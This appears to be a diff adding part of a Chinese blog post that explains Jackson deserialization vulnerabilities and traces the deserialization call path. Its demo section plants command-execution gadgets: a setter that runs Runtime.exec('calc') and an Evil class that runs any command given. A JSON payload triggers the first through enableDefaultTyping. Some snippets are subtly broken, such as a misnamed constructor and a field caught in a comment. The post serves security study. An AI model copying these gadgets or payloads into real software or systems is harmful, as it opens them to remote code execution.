+<p>输出看到，object 属性中多了 <code>&quot;@type&quot;:&quot;Hacker&quot;</code>，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/errorName.png" class>
+<h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p>
+<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>由前面测试发现，当 <code>@JsonTypeInfo</code> 注解设置为如下值之一并且修饰的是 Object 类型的属性时，可以利用来触发 Jackson 反序列化漏洞：</p>
+<ul>
+<li>JsonTypeInfo.Id.CLASS</li>
+<li>JsonTypeInfo. Id. MINIMAL_CLASS</li>
+</ul>
+<h2 id="0x03-反序列化中类属性方法的调用"><a href="#0x03-反序列化中类属性方法的调用" class="headerlink" title="0x03 反序列化中类属性方法的调用"></a>0x03 反序列化中类属性方法的调用</h2><p>这里只针对 Jackson 反序列化过程中存在的一些方法调用进行分析，并且只针对应用 JacksonPolymorphicDeserialization 机制的场景进行分析。</p>
+<p>下面简单看下两个实现方式间是否有区别。</p>
+<h3 id="当使用-DefaultTyping-时"><a href="#当使用-DefaultTyping-时" class="headerlink" title="当使用 DefaultTyping 时"></a>当使用 DefaultTyping 时</h3><p>新增 Person3 类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 MySex 类中的方法中添加输出：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex2</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex2</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改反序列化代码，只进行反序列化操作并调用无参数的 <code>enableDefaultTyping()</code> ：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">            mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">            <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">            System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出，看到调用了目标类的构造函数和 setter 方法：</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializationTest.png" class>
+
+<h3 id="当使用-JsonTypeInfo-注解时"><a href="#当使用-JsonTypeInfo-注解时" class="headerlink" title="当使用 @JsonTypeInfo 注解时"></a>当使用 @JsonTypeInfo 注解时</h3><p>修改 Person3 类，在 sex 属性前添加注解：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  </span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改 DeserializationTest2. java，注释掉 enableDefaultTyping ()：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest2</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line"><span class="comment">//        mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出看到，和使用 DefaultTyping 是一样的：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.deserialization.MySex2@<span class="number">6</span>a2bcfcb</span><br></pre></td></tr></table></figure>
+
+<h3 id="Jackson-反序列化调试分析"><a href="#Jackson-反序列化调试分析" class="headerlink" title="Jackson 反序列化调试分析"></a>Jackson 反序列化调试分析</h3><p>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</p>
+<p>这里以第一个例子来进行 Jackson 反序列化过程的调试分析，在 <code>Person p2 = mapper.readValue(json, Person.class);</code> 处打上断点，同时在 MySex2 类的构造函数、getter、setter 方法中设置断点，然后开始调试</p>
+<p>另外，为了方便，给 Person3 类加上个构造函数，随后开始调试</p>
+<p>首先反序列化跟进来，在 <code>com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose()</code> 方法这里，先进行 <code>JsonToken</code> 的初始化，随后进行进一步的反序列化操作。</p>
+<p>当初始化是第一次的时候，会先调到 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserialize()</code> 方法</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/vanillaDeserialize.png" class>
+
+<p>跟进，<code>vanillaDeserialize()</code> 方法调用了 <code>createUsingDefault()</code> 方法，这个方法的作用是调用指定类的无参构造函数，生成类实例。</p>
+<p>再次跟进就是调用 <code>call()</code> 方法了</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/call.png" class>
+
+<p>走到了构造函数</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/constructor.png" class>
+
+<p>在初始化完毕之后，会调用 <code>deserializeAndSet()</code> 方法，完成了一个嵌套的过程，具体的细节后面会讲。</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSetFirst.png" class>
+
+<p>跟进去之后会发现这里调用了 <code>this.deserialize()</code> 方法，跟进 <code>deser.deserialize()</code>，具体的业务逻辑是在 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserializeAndSet()</code> 方法执行的，实际上就是我们前面说的 <strong>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</strong> 跟进</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSet.png" class>
+
+<p>继续跟进 <code>this.deserialize()</code>，这里先拿了 json 数据的数据类型，接下来判断这个节点的数据类型是否为 null，如果不为 null，再判断 <code>this._valueTypeDeserializer</code> 是否为空，如果不为空则继续调用 <code>this._valueDeserializer.deserialize()</code> 方法</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/businessDeser.png" class>
+
+<p>这里 t 是存在的，且反序列化程序也是存在的，所以调用 <code>deserialize()</code> 方法</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/judgeDeserialize.png" class>
+
+<p>判断是否为 <code>VALUE_NUMBER_INT</code>，如果是则跟进 <code>getIntValue()</code> 方法，如果不是则跟进 <code>_parseInteger()</code> 方法，这里最终整个调完之后，会返回 json 键值对中的值</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/objectValue.png" class>
+
+<p>随后的 <code>this._field.set(instance, value);</code> 意思就是调用对应类的 setter 方法了，进行赋值。因为这里我们没有写 Person3 这个类的 setter 方法，如果实现了 setter 方法，则代码逻辑会走进去。</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/invokeForSetter.png" class>
+
+<p>在调用完成之后又会重新回到 <code>BeanDeserializer.vanillaDeserialize()</code>  函数中的 do while 循环，继续获取值，继续调用，达到递归的效果。</p>
+<p>不太一样的是在 <code>SettableBeanProperty.deserialize()</code>  函数中进入到了调用 <code>deserializeWithType()</code> 函数解析的代码逻辑，因为此时 <code>_valueTypeDeserializer</code> 值不为 null：</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/diffDeserialize.png" class>
+
+<p>往下，先判断反序列化的类型，因为这里是数组，所以会返回 null，再跟进 <code>deserializeTypedFromObject()</code> 方法</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromObject.png" class>
+
+<p>同样因为是数组，跟进 <code>_deserializeTypedUsingDefaultImpl()</code> 方法</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedUsingDefaultImpl.png" class>
+
+<p>随后寻找反序列化的类</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/findDefaultImplDeserializer.png" class>
+
+<p>因为这里的数据类型是数组，不匹配任意一项，所以最后调用了 <code>deserializeTypedFromAny()</code> 方法，这个方法最终是让程序去已有的类里面找，很明显这里找的是 <code>com.drunkbaby.deserialization.MySex2</code> 类</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromAny.png" class>
+
+<p>跟进去，其中调用 <code>findContextualValueDeserializer()</code> 找到 typeId 类型对应的反序列化器，然后缓存到 <code>_deserializers</code> 这个 Map 变量中，然后返回该反序列化器</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/putTypeID.png" class>
+
+<p>接着程序回到数组类型解析的 <code>AsArrayTypeDeserializer._deserialize()</code> 函数中往下执行，用刚刚获取到的反序列化器来解析 sex 属性中数组内的具体类型实例：</p>
+<img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/finaldeserialize.png" class>
+
+<p>这里的逻辑比较简单，判断目前这个数据类型是否已经有对应的反序列化处理器了，如果没有则最终还是走原来那一套，如果有的话则走 Jackson 自己的规则。</p>
+<p>至于后续的逻辑和最开始的反序列化逻辑是很类似的，简单看一下关键部分的调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;: <span class="number">8</span>, MySex2 (com. drunkbaby. deserialization)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">call:<span class="number">119</span>, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createUsingDefault:<span class="number">243</span>, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">vanillaDeserialize:<span class="number">249</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:<span class="number">125</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:<span class="number">110</span>, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br></pre></td></tr></table></figure>
+
+<p>后续过程就不再展开了，是相似的调用过程。</p>
+<p>至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo 注解的函数调用过程也是一样的。</p>
+<ul>
+<li>简单梳理一遍，Jackson 反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用 Object 类型属性的构造函数和 setter 方法。</li>
+</ul>
+<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong>在 Jackson 反序列化中，若调用了 <code>enableDefaultTyping()</code> 函数或使用 <code>@JsonTypeInfo</code> 注解指定反序列化得到的类的属性为 <code>JsonTypeInfo.Id.CLASS</code> 或 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>，则会调用该属性的类的构造函数和 setter 方法。</strong></p>
+<h2 id="0x04-Jackson-反序列化漏洞"><a href="#0x04-Jackson-反序列化漏洞" class="headerlink" title="0x04 Jackson 反序列化漏洞"></a>0x04 Jackson 反序列化漏洞</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p>
+<ul>
+<li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li>
+<li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li>
+<li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li>
+</ul>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由之前的结论知道，当使用的 JacksonPolymorphicDeserialization 机制配置有问题时，Jackson 反序列化就会调用属性所属类的构造函数和 setter 方法。</p>
+<p>而如果该构造函数或 setter 方法存在危险操作，那么就存在 Jackson 反序列化漏洞。</p>
+<h3 id="漏洞场景及-Demo"><a href="#漏洞场景及-Demo" class="headerlink" title="漏洞场景及 Demo"></a>漏洞场景及 Demo</h3><p>这里大致以要进行反序列化的类的属性所属的类的类型分为两种：</p>
+<h4 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h4><p><strong>当要进行反序列化的类的属性所属类的构造函数或 setter 方法本身存在漏洞时，这种场景存在 Jackson 反序列化漏洞。当然这种场景开发几乎不会这么写。</strong></p>
+<p>我们看个例子，直接修改 MySex 类的 setSex ()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Peson3 类不变</p>
+<p>编写反序列化类，构造 Payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationRun</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.JacksonVul.EvilSex\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="属性为-Object-类时"><a href="#属性为-Object-类时" class="headerlink" title="属性为 Object 类时"></a>属性为 Object 类时</h4><p><strong>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</strong></p>
+<p>后面出现的 Jackson 反序列化的 CVE 漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链。</p>
+<p>我们编写一个存在漏洞的代码</p>
+<p><strong>Evil.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    String cmd;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="built_in">this</span>.cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Person4.java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person4</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  </span></span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)    public Object object;  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person4</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;Person3 setter 函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着编写反序列化代码</p>
